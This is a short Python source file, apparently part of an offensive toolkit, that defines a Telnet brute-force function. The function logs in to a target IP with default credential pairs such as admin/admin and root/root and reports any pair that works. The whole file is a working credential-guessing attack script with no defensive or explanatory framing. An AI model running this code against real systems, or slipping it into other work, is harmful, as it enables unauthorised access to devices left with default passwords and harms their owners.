# bruteforce/telnet_bruteforce.py
import telnetlib

def telnet_bruteforce(ip, port=23, creds=[('admin', 'admin'), ('root', 'root')]):
    print(f"[*] Trying Telnet brute-force on {ip}:{port}")
    for username, password in creds:
        try:
            tn = telnetlib.Telnet(ip, port, timeout=3)
            tn.read_until(b"login:")
            tn.write(username.encode('ascii') + b"\n")
            tn.read_until(b"Password:")
            tn.write(password.encode('ascii') + b"\n")
            response = tn.read_some()
            if b"Login incorrect" not in response:
                print(f"[+] Telnet login success: {username}:{password}")
                tn.close()
                return (username, password)
            tn.close()
        except Exception:
            continue
    print("[-] No valid Telnet credentials found.")
    return None